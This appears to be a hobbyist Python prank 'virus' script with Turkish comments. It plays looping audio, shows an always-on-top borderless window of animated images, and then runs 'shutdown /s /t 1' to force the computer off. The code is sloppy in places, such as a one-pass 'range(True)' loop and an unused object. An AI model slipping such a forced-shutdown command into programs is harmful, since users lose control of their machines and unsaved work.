import tkinter as tk
import threading
import pyautogui as pyautogui
import pygame
import random
import subprocess
import time

#subprocess  kodların çalışması ve sonrasında bilgisayarın kapanması sağlar



for i in range(True):
    pygame.init()
    pygame.mixer.init()
    pygame.mixer.music.load("effect.mp3")
    pygame.mixer.music.play(-1)



TRNAS_COLOR = '#abcdef'
class Object:
    def __init__(self, x, y):
        self.image1 = x
        self.image2 = y

    def move(self):
        self.image1 += random.randint(-1, 1)
        self.image2 += random.randint(-1, 1)

obj = Object(0, 0)

# Nesnenin koordinatlarını rastgele değiştirerek hareket ettir
for i in range(10):
    obj.move()

root = tk.Tk()
root.attributes("-topmost", True)
root.overrideredirect(1)
root.attributes('-transparentcolor', TRNAS_COLOR)
root.geometry("+1700+443")

image1 = tk.PhotoImage(file='C:\\Users\\Yusuf\\Desktop\\virüs_proje\\Drawing(5).png')
image2 = tk.PhotoImage(file='C:\\Users\\Yusuf\\Desktop\\virüs_proje\\Drawing(6).png')

images=[image1, image2]
label=tk.Label(root,image=image2, bg=TRNAS_COLOR)

label.pack()
counter=0
def update_image():
    global counter
    # label'ın resmini değiştirme
    label.config(image=images[counter])
    counter +=1
    if counter >= len(images):
        counter=0
    # update_image fonksiyonunu tekrar çağırma
    root.after(400, update_image)

root.after(500, update_image)
#change_geometry()

root.mainloop()

# root döngüsü içerisinde olunca resim kullanılmıyor
time.sleep(30) # 30 saniye bekleyin
subprocess.run("shutdown /s /t 1", shell=True) # 1 saniye içinde bilgisayarı kapatın

